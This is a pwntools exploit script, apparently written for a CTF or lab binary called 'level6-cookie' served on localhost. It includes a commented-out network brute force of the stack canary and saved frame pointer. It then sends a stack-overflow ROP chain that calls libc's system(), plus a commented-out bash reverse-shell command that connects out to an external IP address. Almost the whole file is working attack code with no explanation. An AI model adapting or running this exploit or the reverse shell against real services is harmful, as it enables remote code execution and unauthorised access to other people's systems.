from pwn import *
context.log_level="debug"

elf=ELF("./level6-cookie")
libc=ELF("./libc-2.23.so")

canary=p32(0xac66fa00)
rbp=p32(0xffd13d14)
"""
for j in range(4):
    for i in range(256):
        if i==10:
            continue
        r=remote("127.0.0.1",10006)
        sh='a'*0x40+canary+'a'*8+rbp+chr(i)
        try:
            r.recv()
            r.sendline(sh)
            r.recv()
            r.close()
        except:
            continue
        else:
            #canary=canary+chr(i)
            rbp=rbp+chr(i)
            r.close()
            break
"""

bind=p32(0x804B048)
write=p32(0x08048CC3)
libc.address=0xf75f2000
read=p32(0x8048BB7)
bss=p32(0x804b800)
sym=libc.sym["system"]
pop3=p32(0x08048fb9)
pop1=p32(0x08048fbb)
recv=libc.sym["recv"]
r=remote("127.0.0.1",10006)

f=p32(0x8048BB7)

#sh='a'*0x40+canary+'a'*0x8+rbp+p32(elf.plt['recv'])+pop3+p32(4)+bss+p32(0x100)+p32(0)+pop1
sh='a'*0x40+canary+'a'*0x8+rbp+f+pop3+p32(4)+bss+p32(53)+p32(sym)+p32(0)+bss
#sh='a'*0x40+canary+'a'*0x8+rbp+p32(recv)+pop3+p32(3)+bss+p32(0x100)+p32(sym)+p32(0)+bss

r.recv()
pause()
r.sendline(sh)
#r.sendline('bash -c "bash -i >& /dev/tcp/138.68.0.234/1234 0>&1"')

r.interactive()
